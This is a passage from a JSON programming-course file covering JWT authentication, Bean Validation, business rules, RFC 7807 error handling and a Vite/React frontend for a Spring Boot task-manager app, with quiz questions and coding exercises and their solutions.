{ return createdAt; }\n    public List<Task> getTasks() { return tasks; }\n    public List<Category> getCategories() { return categories; }\n\n    @PrePersist\n    protected void onCreate() {\n        this.createdAt = LocalDateTime.now();\n    }\n}\n\n// com/taskmanager/security/UserDetailsServiceImpl.java\npackage com.taskmanager.security;\n\nimport com.taskmanager.repository.UserRepository;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.core.userdetails.UsernameNotFoundException;\nimport org.springframework.stereotype.Service;\n\n@Service\npublic class UserDetailsServiceImpl implements UserDetailsService {\n\n    private final UserRepository userRepository;\n\n    public UserDetailsServiceImpl(UserRepository userRepository) {\n        this.userRepository = userRepository;\n    }\n\n    @Override\n    public UserDetails loadUserByUsername(String email) throws UsernameNotFoundException {\n        return userRepository.findByEmail(email.toLowerCase())\n                .orElseThrow(() -> new UsernameNotFoundException(\n                    \"User not found with email: \" + email));\n    }\n}\n```\n\nUserDetails Interface:\n- getAuthorities(): Returns user's roles/permissions\n- getUsername(): Returns the unique identifier (email in our case)\n- getPassword(): Returns hashed password for comparison\n- isEnabled(), isAccountNonLocked(), etc.: Account status checks\n\nBy implementing UserDetails, our User entity can be used directly with Spring Security without creating a separate wrapper class."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "capstone-16-4-jwt-flow",
              "title": "JWT Authentication Flow",
              "description": "Understand how JWT authentication works in our application.",
              "question": "After a user successfully logs in, what is stored in the SecurityContext for subsequent requests?",
              "options": [
                {
                  "id": "a",
                  "text": "The JWT token string itself",
                  "isCorrect": false
                },
                {
                  "id": "b",
                  "text": "The user's password (encrypted)",
                  "isCorrect": false
                },
                {
                  "id": "c",
                  "text": "A UsernamePasswordAuthenticationToken containing the UserDetails",
                  "isCorrect": true
                },
                {
                  "id": "d",
                  "text": "The HTTP session ID",
                  "isCorrect": false
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "FREE_CODING",
              "id": "capstone-16-4-refresh-token",
              "title": "Implement Token Refresh Endpoint",
              "description": "Add a token refresh endpoint that issues a new JWT when the current one is still valid.",
              "instructions": "Implement a /api/auth/refresh endpoint in AuthController that:\n1. Accepts the current valid JWT in the Authorization header\n2. Verifies the token is still valid\n3. Issues a new token with a fresh expiration\n4. Returns the new token in AuthResponse format",
              "starterCode": "// Add this method to AuthController\n\n@PostMapping(\"/refresh\")\npublic ResponseEntity<AuthResponse> refreshToken(\n        @AuthenticationPrincipal User user) {\n    // TODO: Implement token refresh\n}",
              "solution": "@PostMapping(\"/refresh\")\npublic ResponseEntity<AuthResponse> refreshToken(\n        @AuthenticationPrincipal User user) {\n    // User is already authenticated (JWT was valid)\n    // Generate new token with fresh expiration\n    String newToken = jwtService.generateToken(user);\n    \n    return ResponseEntity.ok(\n        new AuthResponse(newToken, user.getEmail(), user.getName()));\n}\n\n// Note: You'll need to inject JwtService into AuthController:\n// private final JwtService jwtService;\n// \n// public AuthController(AuthService authService, JwtService jwtService) {\n//     this.authService = authService;\n//     this.jwtService = jwtService;\n// }",
              "language": "java",
              "testCases": [],
              "hints": [
                {
                  "level": 1,
                  "text": "Since this endpoint requires authentication, @AuthenticationPrincipal already gives you the validated user."
                },
                {
                  "level": 2,
                  "text": "You can inject JwtService into the controller or add a refreshToken method to AuthService."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "capstone-lesson-5",
          "title": "Lesson 16.5: Business Logic & Validation",
          "moduleId": "module-16",
          "order": 5,
          "estimatedMinutes": 55,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Bean Validation Annotations",
              "content": "Jakarta Bean Validation (formerly javax.validation) provides declarative validation through annotations. These annotations enforce data constraints before your business logic processes the data, catching invalid input early.\n\nCore Validation Annotations:\n\n@NotNull - Value cannot be null\n@NotBlank - String cannot be null, empty, or whitespace only (most common for strings)\n@NotEmpty - Collection/String cannot be null or empty (but allows whitespace strings)\n@Size(min, max) - String/Collection length must be within bounds\n@Min(value) / @Max(value) - Numeric value bounds\n@Email - Must be valid email format\n@Pattern(regexp) - Must match regular expression\n@Past / @Future - Date must be in past or future\n@PastOrPresent / @FutureOrPresent - Include today\n@Positive / @PositiveOrZero - Number must be > 0 or >= 0\n@Negative / @NegativeOrZero - Number must be < 0 or <= 0\n\nExample Request DTO:\n```java\npackage com.taskmanager.dto.request;\n\nimport jakarta.validation.constraints.*;\nimport java.time.LocalDate;\n\npublic class TaskRequest {\n\n    @NotBlank(message = \"Title is required\")\n    @Size(min = 1, max = 255, message = \"Title must be 1-255 characters\")\n    private String title;\n\n    @Size(max = 5000, message = \"Description cannot exceed 5000 characters\")\n    private String description;\n\n    @FutureOrPresent(message = \"Due date cannot be in the past\")\n    private LocalDate dueDate;\n\n    private String status;   // Validated by custom validator\n    private String priority; // Validated by custom validator\n    \n    private Long categoryId;\n\n    // Getters and setters...\n}\n```\n\nActivating Validation:\nAdd @Valid before @RequestBody in controller methods:\n```java\n@PostMapping\npublic ResponseEntity<TaskResponse> createTask(\n        @Valid @RequestBody TaskRequest request,  // @Valid triggers validation\n        @AuthenticationPrincipal User user) {\n    // This code only runs if validation passes\n}\n```\n\nWhen validation fails, Spring throws MethodArgumentNotValidException, which we handle in our GlobalExceptionHandler."
            },
            {
              "type": "THEORY",
              "title": "Custom Validators",
              "content": "For complex validation logic that cannot be expressed with built-in annotations, create custom validators. Let us create a @ValidPriority annotation that ensures the priority value is one of our allowed enum values.\n\n```java\n// com/taskmanager/validation/ValidPriority.java\npackage com.taskmanager.validation;\n\nimport jakarta.validation.Constraint;\nimport jakarta.validation.Payload;\nimport java.lang.annotation.*;\n\n@Documented\n@Constraint(validatedBy = PriorityValidator.class)\n@Target({ElementType.FIELD, ElementType.PARAMETER})\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface ValidPriority {\n    String message() default \"Invalid priority. Must be LOW, MEDIUM, HIGH, or URGENT\";\n    Class<?>[] groups() default {};\n    Class<? extends Payload>[] payload() default {};\n}\n\n// com/taskmanager/validation/PriorityValidator.java\npackage com.taskmanager.validation;\n\nimport com.taskmanager.model.enums.Priority;\nimport jakarta.validation.ConstraintValidator;\nimport jakarta.validation.ConstraintValidatorContext;\n\npublic class PriorityValidator implements ConstraintValidator<ValidPriority, String> {\n\n    @Override\n    public void initialize(ValidPriority constraintAnnotation) {\n        // No initialization needed\n    }\n\n    @Override\n    public boolean isValid(String value, ConstraintValidatorContext context) {\n        // Null is valid (use @NotNull if required)\n        if (value == null) {\n            return true;\n        }\n\n        try {\n            Priority.valueOf(value.toUpperCase());\n            return true;\n        } catch (IllegalArgumentException e) {\n            return false;\n        }\n    }\n}\n\n// com/taskmanager/validation/ValidStatus.java\npackage com.taskmanager.validation;\n\nimport jakarta.validation.Constraint;\nimport jakarta.validation.Payload;\nimport java.lang.annotation.*;\n\n@Documented\n@Constraint(validatedBy = StatusValidator.class)\n@Target({ElementType.FIELD, ElementType.PARAMETER})\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface ValidStatus {\n    String message() default \"Invalid status. Must be PENDING, IN_PROGRESS, COMPLETED, or CANCELLED\";\n    Class<?>[] groups() default {};\n    Class<? extends Payload>[] payload() default {};\n}\n\n// com/taskmanager/validation/StatusValidator.java\npackage com.taskmanager.validation;\n\nimport com.taskmanager.model.enums.TaskStatus;\nimport jakarta.validation.ConstraintValidator;\nimport jakarta.validation.ConstraintValidatorContext;\n\npublic class StatusValidator implements ConstraintValidator<ValidStatus, String> {\n\n    @Override\n    public boolean isValid(String value, ConstraintValidatorContext context) {\n        if (value == null) {\n            return true;\n        }\n\n        try {\n            TaskStatus.valueOf(value.toUpperCase());\n            return true;\n        } catch (IllegalArgumentException e) {\n            return false;\n        }\n    }\n}\n```\n\nUsing Custom Validators:\n```java\npublic class TaskRequest {\n    \n    @NotBlank\n    private String title;\n    \n    @ValidStatus\n    private String status;\n    \n    @ValidPriority\n    private String priority;\n}\n```\n\nThis approach provides user-friendly error messages when clients send invalid enum values like \"SUPER_HIGH\" instead of generic JSON parsing errors."
            },
            {
              "type": "THEORY",
              "title": "Task Due Date and Priority Business Rules",
              "content": "Business logic goes beyond simple field validation. Our TaskService must enforce rules about how tasks behave based on their state and relationships.\n\n```java\n// com/taskmanager/service/TaskService.java - Business Logic Methods\npackage com.taskmanager.service;\n\nimport com.taskmanager.dto.request.TaskRequest;\nimport com.taskmanager.dto.response.TaskResponse;\nimport com.taskmanager.exception.BusinessRuleException;\nimport com.taskmanager.exception.ResourceNotFoundException;\nimport com.taskmanager.model.Category;\nimport com.taskmanager.model.Task;\nimport com.taskmanager.model.User;\nimport com.taskmanager.model.enums.Priority;\nimport com.taskmanager.model.enums.TaskStatus;\nimport com.taskmanager.repository.CategoryRepository;\nimport com.taskmanager.repository.TaskRepository;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport java.time.LocalDate;\nimport java.time.LocalDateTime;\nimport java.util.List;\n\n@Service\n@Transactional\npublic class TaskService {\n\n    private final TaskRepository taskRepository;\n    private final CategoryRepository categoryRepository;\n\n    public TaskService(TaskRepository taskRepository,\n                       CategoryRepository categoryRepository) {\n        this.taskRepository = taskRepository;\n        this.categoryRepository = categoryRepository;\n    }\n\n    /**\n     * Business Rule: Cannot set due date in the past for new tasks\n     */\n    public TaskResponse createTask(TaskRequest request, User user) {\n        if (request.getDueDate() != null && request.getDueDate().isBefore(LocalDate.now())) {\n            throw new BusinessRuleException(\"Due date cannot be in the past\");\n        }\n\n        Task task = new Task();\n        task.setTitle(request.getTitle().trim());\n        task.setDescription(request.getDescription());\n        task.setStatus(parseStatus(request.getStatus(), TaskStatus.PENDING));\n        task.setPriority(parsePriority(request.getPriority(), Priority.MEDIUM));\n        task.setDueDate(request.getDueDate());\n        task.setOwner(user);\n\n        if (request.getCategoryId() != null) {\n            assignCategory(task, request.getCategoryId(), user);\n        }\n\n        return TaskResponse.fromEntity(taskRepository.save(task));\n    }\n\n    /**\n     * Business Rule: Completed tasks cannot be modified\n     */\n    public TaskResponse updateTask(Long taskId, TaskRequest request, User user) {\n        Task task = findTaskAndVerifyOwnership(taskId, user);\n\n        if (task.getStatus() == TaskStatus.COMPLETED) {\n            throw new BusinessRuleException(\n                \"Cannot modify a completed task. Reopen it first.\");\n        }\n\n        task.setTitle(request.getTitle().trim());\n        task.setDescription(request.getDescription());\n        \n        if (request.getStatus() != null) {\n            task.setStatus(parseStatus(request.getStatus(), task.getStatus()));\n        }\n        if (request.getPriority() != null) {\n            task.setPriority(parsePriority(request.getPriority(), task.getPriority()));\n        }\n        \n        task.setDueDate(request.getDueDate());\n\n        if (request.getCategoryId() != null) {\n            assignCategory(task, request.getCategoryId(), user);\n        } else {\n            task.setCategory(null);\n        }\n\n        return TaskResponse.fromEntity(taskRepository.save(task));\n    }\n\n    /**\n     * Business Rule: Mark task complete with completion timestamp\n     */\n    public TaskResponse markComplete(Long taskId, User user) {\n        Task task = findTaskAndVerifyOwnership(taskId, user);\n\n        if (task.getStatus() == TaskStatus.COMPLETED) {\n            throw new BusinessRuleException(\"Task is already completed\");\n        }\n\n        task.setStatus(TaskStatus.COMPLETED);\n        // Note: Add completedAt field to Task entity if needed\n        \n        return TaskResponse.fromEntity(taskRepository.save(task));\n    }\n\n    /**\n     * Business Rule: Reopen a completed task (sets to IN_PROGRESS)\n     */\n    public TaskResponse reopenTask(Long taskId, User user) {\n        Task task = findTaskAndVerifyOwnership(taskId, user);\n\n        if (task.getStatus() != TaskStatus.COMPLETED) {\n            throw new BusinessRuleException(\"Only completed tasks can be reopened\");\n        }\n\n        task.setStatus(TaskStatus.IN_PROGRESS);\n        return TaskResponse.fromEntity(taskRepository.save(task));\n    }\n\n    /**\n     * Auto-escalate overdue tasks to URGENT priority\n     */\n    public List<TaskResponse> escalateOverdueTasks(User user) {\n        List<Task> overdueTasks = taskRepository.findOverdueTasks(\n            user.getId(), LocalDate.now());\n\n        overdueTasks.stream()\n            .filter(t -> t.getPriority() != Priority.URGENT)\n            .forEach(t -> t.setPriority(Priority.URGENT));\n\n        return taskRepository.saveAll(overdueTasks).stream()\n            .map(TaskResponse::fromEntity)\n            .toList();\n    }\n\n    // Helper methods\n    private void assignCategory(Task task, Long categoryId, User user) {\n        Category category = categoryRepository\n            .findByIdAndOwnerId(categoryId, user.getId())\n            .orElseThrow(() -> new ResourceNotFoundException(\n                \"Category not found: \" + categoryId));\n        task.setCategory(category);\n    }\n\n    private TaskStatus parseStatus(String value, TaskStatus defaultValue) {\n        if (value == null) return defaultValue;\n        try {\n            return TaskStatus.valueOf(value.toUpperCase());\n        } catch (IllegalArgumentException e) {\n            return defaultValue;\n        }\n    }\n\n    private Priority parsePriority(String value, Priority defaultValue) {\n        if (value == null) return defaultValue;\n        try {\n            return Priority.valueOf(value.toUpperCase());\n        } catch (IllegalArgumentException e) {\n            return defaultValue;\n        }\n    }\n\n    private Task findTaskAndVerifyOwnership(Long taskId, User user) {\n        return taskRepository.findByIdAndOwnerId(taskId, user.getId())\n            .orElseThrow(() -> new ResourceNotFoundException(\n                \"Task not found: \" + taskId));\n    }\n}\n```\n\nBusiness rules implemented:\n1. New tasks cannot have past due dates\n2. Completed tasks are immutable until reopened\n3. Marking complete is a distinct action from updating\n4. Overdue tasks can be auto-escalated to URGENT"
            },
            {
              "type": "THEORY",
              "title": "Problem Details (RFC 7807) Error Responses",
              "content": "RFC 7807 defines a standard format for HTTP API error responses. Spring 6 has built-in support through ProblemDetail class. This standardization helps frontend developers handle errors consistently.\n\n```java\n// com/taskmanager/exception/GlobalExceptionHandler.java\npackage com.taskmanager.exception;\n\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ProblemDetail;\nimport org.springframework.security.authentication.BadCredentialsException;\nimport org.springframework.validation.FieldError;\nimport org.springframework.web.bind.MethodArgumentNotValidException;\nimport org.springframework.web.bind.annotation.ExceptionHandler;\nimport org.springframework.web.bind.annotation.RestControllerAdvice;\n\nimport java.net.URI;\nimport java.time.Instant;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@RestControllerAdvice\npublic class GlobalExceptionHandler {\n\n    @ExceptionHandler(ResourceNotFoundException.class)\n    public ProblemDetail handleResourceNotFound(ResourceNotFoundException ex) {\n        ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n            HttpStatus.NOT_FOUND, ex.getMessage());\n        problem.setTitle(\"Resource Not Found\");\n        problem.setType(URI.create(\"https://api.taskmanager.com/errors/not-found\"));\n        problem.setProperty(\"timestamp\", Instant.now());\n        return problem;\n    }\n\n    @ExceptionHandler(DuplicateResourceException.class)\n    public ProblemDetail handleDuplicateResource(DuplicateResourceException ex) {\n        ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n            HttpStatus.CONFLICT, ex.getMessage());\n        problem.setTitle(\"Resource Already Exists\");\n        problem.setType(URI.create(\"https://api.taskmanager.com/errors/duplicate\"));\n        problem.setProperty(\"timestamp\", Instant.now());\n        return problem;\n    }\n\n    @ExceptionHandler(BusinessRuleException.class)\n    public ProblemDetail handleBusinessRule(BusinessRuleException ex) {\n        ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n            HttpStatus.UNPROCESSABLE_ENTITY, ex.getMessage());\n        problem.setTitle(\"Business Rule Violation\");\n        problem.setType(URI.create(\"https://api.taskmanager.com/errors/business-rule\"));\n        problem.setProperty(\"timestamp\", Instant.now());\n        return problem;\n    }\n\n    @ExceptionHandler(BadCredentialsException.class)\n    public ProblemDetail handleBadCredentials(BadCredentialsException ex) {\n        ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n            HttpStatus.UNAUTHORIZED, \"Invalid email or password\");\n        problem.setTitle(\"Authentication Failed\");\n        problem.setType(URI.create(\"https://api.taskmanager.com/errors/auth-failed\"));\n        problem.setProperty(\"timestamp\", Instant.now());\n        return problem;\n    }\n\n    @ExceptionHandler(MethodArgumentNotValidException.class)\n    public ProblemDetail handleValidationErrors(MethodArgumentNotValidException ex) {\n        Map<String, String> fieldErrors = new HashMap<>();\n        for (FieldError error : ex.getBindingResult().getFieldErrors()) {\n            fieldErrors.put(error.getField(), error.getDefaultMessage());\n        }\n\n        ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n            HttpStatus.BAD_REQUEST, \"Validation failed for one or more fields\");\n        problem.setTitle(\"Validation Error\");\n        problem.setType(URI.create(\"https://api.taskmanager.com/errors/validation\"));\n        problem.setProperty(\"timestamp\", Instant.now());\n        problem.setProperty(\"errors\", fieldErrors);\n        return problem;\n    }\n\n    @ExceptionHandler(Exception.class)\n    public ProblemDetail handleGenericException(Exception ex) {\n        // Log the actual error for debugging\n        // logger.error(\"Unexpected error\", ex);\n        \n        ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n            HttpStatus.INTERNAL_SERVER_ERROR, \n            \"An unexpected error occurred. Please try again later.\");\n        problem.setTitle(\"Internal Server Error\");\n        problem.setType(URI.create(\"https://api.taskmanager.com/errors/internal\"));\n        problem.setProperty(\"timestamp\", Instant.now());\n        return problem;\n    }\n}\n\n// com/taskmanager/exception/BusinessRuleException.java\npackage com.taskmanager.exception;\n\npublic class BusinessRuleException extends RuntimeException {\n    public BusinessRuleException(String message) {\n        super(message);\n    }\n}\n```\n\nProblemDetail Response Format:\n```json\n{\n  \"type\": \"https://api.taskmanager.com/errors/validation\",\n  \"title\": \"Validation Error\",\n  \"status\": 400,\n  \"detail\": \"Validation failed for one or more fields\",\n  \"instance\": \"/api/tasks\",\n  \"timestamp\": \"2024-01-15T10:30:00Z\",\n  \"errors\": {\n    \"title\": \"Title is required\",\n    \"dueDate\": \"Due date cannot be in the past\"\n  }\n}\n```\n\nBenefits:\n- Standardized format across all endpoints\n- Machine-readable type URI for programmatic handling\n- Human-readable title and detail\n- Extensible with custom properties"
            },
            {
              "type": "THEORY",
              "title": "Validation Error Handling with MethodArgumentNotValidException",
              "content": "When @Valid validation fails, Spring throws MethodArgumentNotValidException. Our exception handler converts this to a user-friendly response with field-specific error messages.\n\nValidation Flow:\n1. Client sends POST /api/tasks with invalid data\n2. @Valid triggers Bean Validation\n3. Validation fails on @NotBlank(\"title\")\n4. Spring throws MethodArgumentNotValidException\n5. GlobalExceptionHandler catches it\n6. Returns 400 Bad Request with error details\n\nEnhanced Validation Error Response:\n```java\n@ExceptionHandler(MethodArgumentNotValidException.class)\npublic ProblemDetail handleValidationErrors(MethodArgumentNotValidException ex) {\n    Map<String, Object> fieldErrors = new HashMap<>();\n    \n    for (FieldError error : ex.getBindingResult().getFieldErrors()) {\n        String field = error.getField();\n        String message = error.getDefaultMessage();\n        Object rejectedValue = error.getRejectedValue();\n        \n        Map<String, Object> errorDetail = new HashMap<>();\n        errorDetail.put(\"message\", message);\n        errorDetail.put(\"rejectedValue\", rejectedValue);\n        \n        fieldErrors.put(field, errorDetail);\n    }\n\n    ProblemDetail problem = ProblemDetail.forStatusAndDetail(\n        HttpStatus.BAD_REQUEST, \n        String.format(\"Validation failed for %d field(s)\", fieldErrors.size()));\n    problem.setTitle(\"Validation Error\");\n    problem.setType(URI.create(\"https://api.taskmanager.com/errors/validation\"));\n    problem.setProperty(\"timestamp\", Instant.now());\n    problem.setProperty(\"errors\", fieldErrors);\n    \n    return problem;\n}\n```\n\nRich Error Response:\n```json\n{\n  \"type\": \"https://api.taskmanager.com/errors/validation\",\n  \"title\": \"Validation Error\",\n  \"status\": 400,\n  \"detail\": \"Validation failed for 2 field(s)\",\n  \"timestamp\": \"2024-01-15T10:30:00Z\",\n  \"errors\": {\n    \"title\": {\n      \"message\": \"Title is required\",\n      \"rejectedValue\": null\n    },\n    \"priority\": {\n      \"message\": \"Invalid priority. Must be LOW, MEDIUM, HIGH, or URGENT\",\n      \"rejectedValue\": \"SUPER_HIGH\"\n    }\n  }\n}\n```\n\nThis format helps frontend developers:\n- Identify which fields failed validation\n- Display appropriate error messages to users\n- Show what value was rejected for debugging"
            },
            {
              "type": "KEY_POINT",
              "title": "Validation Best Practices",
              "content": "Follow these practices for robust validation:\n\n1. Validate at Multiple Layers:\n   - DTO level: Input format, required fields, size limits\n   - Service level: Business rules, cross-field validation, entity state\n   - Database level: Constraints as last line of defense\n\n2. Provide Clear Error Messages:\n   - Bad: \"Invalid value\"\n   - Good: \"Due date must be today or in the future\"\n   - Include the field name and expected format\n\n3. Validate Early, Fail Fast:\n   - Check inputs before expensive operations\n   - Do not let invalid data reach the database\n\n4. Use Groups for Conditional Validation:\n```java\npublic interface OnCreate {}\npublic interface OnUpdate {}\n\npublic class TaskRequest {\n    @Null(groups = OnCreate.class, message = \"ID must be null for create\")\n    @NotNull(groups = OnUpdate.class, message = \"ID is required for update\")\n    private Long id;\n}\n\n// In controller:\n@PostMapping\npublic ResponseEntity<?> create(\n    @Validated(OnCreate.class) @RequestBody TaskRequest request) {...}\n\n@PutMapping(\"/{id}\")\npublic ResponseEntity<?> update(\n    @Validated(OnUpdate.class) @RequestBody TaskRequest request) {...}\n```\n\n5. Sanitize Input:\n```java\ntask.setTitle(request.getTitle().trim());  // Remove leading/trailing whitespace\nuser.setEmail(request.getEmail().toLowerCase().trim());  // Normalize email\n```\n\n6. Do Not Trust Client Data:\n   - Always validate on server side\n   - Client-side validation is for UX only\n   - Assume all input is potentially malicious"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "capstone-16-5-validation",
              "title": "Validation Behavior",
              "description": "Understand how Bean Validation works with Spring.",
              "question": "A TaskRequest has @NotBlank on title and @FutureOrPresent on dueDate. If both are invalid, how many errors will MethodArgumentNotValidException contain?",
              "options": [
                {
                  "id": "a",
                  "text": "1 - validation stops at first failure",
                  "isCorrect": false
                },
                {
                  "id": "b",
                  "text": "2 - all fields are validated and all errors collected",
                  "isCorrect": true
                },
                {
                  "id": "c",
                  "text": "0 - validation is optional unless @Validated is used",
                  "isCorrect": false
                },
                {
                  "id": "d",
                  "text": "Depends on the order of field declarations",
                  "isCorrect": false
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "FREE_CODING",
              "id": "capstone-16-5-custom-validator",
              "title": "Create Cross-Field Validator",
              "description": "Create a class-level validator that ensures description is required when priority is URGENT.",
              "instructions": "Create a custom validator @RequireDescriptionForUrgent that:\n1. Applies at the class level (not field level)\n2. Checks if priority is URGENT\n3. If URGENT, validates that description is not blank\n4. Returns appropriate error message",
              "starterCode": "// Create @RequireDescriptionForUrgent annotation and validator\n// This should be applied at class level:\n// @RequireDescriptionForUrgent\n// public class TaskRequest { ... }",
              "solution": "// com/taskmanager/validation/RequireDescriptionForUrgent.java\n@Documented\n@Constraint(validatedBy = RequireDescriptionForUrgentValidator.class)\n@Target({ElementType.TYPE})\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface RequireDescriptionForUrgent {\n    String message() default \"Description is required for URGENT priority tasks\";\n    Class<?>[] groups() default {};\n    Class<? extends Payload>[] payload() default {};\n}\n\n// com/taskmanager/validation/RequireDescriptionForUrgentValidator.java\npublic class RequireDescriptionForUrgentValidator \n        implements ConstraintValidator<RequireDescriptionForUrgent, TaskRequest> {\n\n    @Override\n    public boolean isValid(TaskRequest request, ConstraintValidatorContext context) {\n        if (request == null) {\n            return true;\n        }\n\n        String priority = request.getPriority();\n        String description = request.getDescription();\n\n        // Only validate if priority is URGENT\n        if (\"URGENT\".equalsIgnoreCase(priority)) {\n            return description != null && !description.trim().isEmpty();\n        }\n\n        return true; // Non-URGENT tasks don't need description\n    }\n}",
              "language": "java",
              "testCases": [],
              "hints": [
                {
                  "level": 1,
                  "text": "Use @Target({ElementType.TYPE}) to make the annotation apply to classes instead of fields."
                },
                {
                  "level": 2,
                  "text": "The validator receives the entire TaskRequest object, allowing you to check multiple fields."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "capstone-lesson-6",
          "title": "Lesson 16.6: React Frontend Development",
          "moduleId": "module-16",
          "order": 6,
          "estimatedMinutes": 65,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Vite + React Project Setup",
              "content": "We will use Vite as our build tool for the React frontend. Vite offers lightning-fast hot module replacement (HMR) and optimized builds, making it the modern choice for React development.\n\nProject Creation:\nOpen a terminal and run:\n```bash\nnpm create vite@latest frontend -- --template react\ncd frontend\nnpm install\n```\n\nInstall Additional Dependencies:\n```bash\n# Routing\nnpm install react-router-dom\n\n# HTTP client\nnpm install axios\n\n# Optional: Tailwind CSS for styling\nnpm install -D tailwindcss postcss autoprefixer\nnpx tailwindcss init -p\n```\n\nTailwind Configuration (tailwind.config.js):\n```javascript\n/** @type {import('tailwindcss').Config} */\nexport default {\n  content: [\n    \"./index.html\",\n    \"./src/**/*.{js,ts,jsx,tsx}\",\n  ],\n  theme: {\n    extend: {},\n  },\n  plugins: [],\n}\n```\n\nAdd Tailwind directives to src/index.css:\n```css\n@tailwind base;\n@tailwind components;\n@tailwind utilities;\n```\n\nEnvironment Variables (.env):\n```\nVITE_API_URL=http://localhost:8080/api\n```\n\nAccess in code:\n```javascript\nconst API_URL = import.meta.env.VITE_API_URL;\n```\n\nStart Development Server:\n```bash\nnpm run dev\n```\n\nThe app will be available at http://localhost:5173. Vite's HMR means changes appear instantly without full page reloads."
            },
            {
              "type": "THEORY",
              "title": "Project Structure: Components, Pages, Services, Context",
              "content": "A well-organized React project follows a clear structure that separates concerns and makes code easy to navigate.\n\n```\nfrontend/\n  src/\n    components/           # Reusable UI components\n      common/\n        Button.jsx\n        Input.jsx\n        Modal.jsx\n        LoadingSpinner.jsx\n      layout/\n        Header.jsx\n        Sidebar.jsx\n        Footer.jsx\n      tasks/\n        TaskCard.jsx\n        TaskList.jsx\n        TaskForm.jsx\n        TaskFilters.jsx\n      categories/\n        CategoryBadge.jsx\n        CategorySelect.jsx\n    \n    pages/                # Page-level components (routes)\n      LoginPage.jsx\n      RegisterPage.jsx\n      DashboardPage.jsx\n      TasksPage.jsx\n      SettingsPage.jsx\n    \n    services/             # API communication layer\n      api.js              # Axios instance with interceptors\n      authService.js      # Login, register, token management\n      taskService.js      # Task CRUD operations\n      categoryService.js  # Category CRUD operations\n    \n    context/              # React Context for global state\n      AuthContext.jsx     # Authentication state\n      TaskContext.jsx     # Task state (optional)\n    \n    hooks/                # Custom React hooks\n      useAuth.js          # Hook to access auth context\n      useTasks.js         # Hook for task operations\n    \n    utils/                # Helper functions\n      formatDate.js\n      priorityColors.js\n    \n    App.jsx               # Root component with routing\n    main.jsx              # Entry point\n    index.css             # Global styles\n```\n\nComponent Organization Rules:\n1. Components are organized by feature (tasks/, categories/) not by type\n2. Pages are top-level route components that compose other components\n3. Services handle all API calls - components never call fetch/axios directly\n4. Context provides global state without prop drilling\n5. Hooks encapsulate reusable stateful logic"
            },
            {
              "type": "THEORY",
              "title": "API Service Layer with Axios",
              "content": "Create a centralized API layer that handles authentication, error handling, and provides clean methods for components to use.\n\n```javascript\n// src/services/api.js\nimport axios from 'axios';\n\nconst API_URL = import.meta.env.VITE_API_URL || 'http://localhost:8080/api';\n\nconst api = axios.create({\n  baseURL: API_URL,\n  headers: {\n    'Content-Type': 'application/json',\n  },\n});\n\n// Request interceptor - add auth token\napi.interceptors.request.use(\n  (config) => {\n    const token = localStorage.getItem('token');\n    if (token) {\n      config.headers.Authorization = `Bearer ${token}`;\n    }\n    return config;\n  },\n  (error) => Promise.reject(error)\n);\n\n// Response interceptor - handle errors globally\napi.interceptors.response.use(\n  (response) => response,\n  (error) => {\n    if (error.response?.status === 401) {\n      // Token expired or invalid\n      localStorage.removeItem('token');\n      window.location.href = '/login';\n    }\n    return Promise.reject(error);\n  }\n);\n\nexport default api;\n\n// src/services/authService.js\nimport api from './api';\n\nexport const authService = {\n  async login(email, password) {\n    const response = await api.post('/auth/login', { email, password });\n    const { token, email: userEmail, name } = response.data;\n    localStorage.setItem('token', token);\n    return { email: userEmail, name };\n  },\n\n  async register(email, password, name) {\n    const response = await api.post('/auth/register', { email, password, name });\n    const { token, email: userEmail, name: userName } = response.data;\n    localStorage.setItem('token', token);\n    return { email: userEmail, name: userName };\n  },\n\n  logout() {\n    localStorage.removeItem('token');\n  },\n\n  isAuthenticated() {\n    return !!localStorage.getItem('token');\n  },\n};\n\n// src/services/taskService.js\nimport api from './api';\n\nexport const taskService = {\n  async getTasks(page = 0, size = 20) {\n    const response = await api.get(`/tasks?page=${page}&size=${size}`);\n    return response.data;\n  },\n\n  async getTask(id) {\n    const response = await api.get(`/tasks/${id}`);\n    return response.data;\n  },\n\n  async createTask(taskData) {\n    const response = await api.post('/tasks', taskData);\n    return response.data;\n  },\n\n  async updateTask(id, taskData) {\n    const response = await api.put(`/tasks/${id}`, taskData);\n    return response.data;\n  },\n\n  async deleteTask(id) {\n    await api.delete(`/tasks/${id}`);\n  },\n};\n```\n\nBenefits of this approach:\n- Token management is automatic via interceptors\n- Consistent error handling across all API calls\n- Components stay clean - they just call service methods\n- Easy to add loading states, caching, or retry logic centrally"
            },
            {
              "type": "THEORY",
              "title": "TaskList Component with Filtering UI",
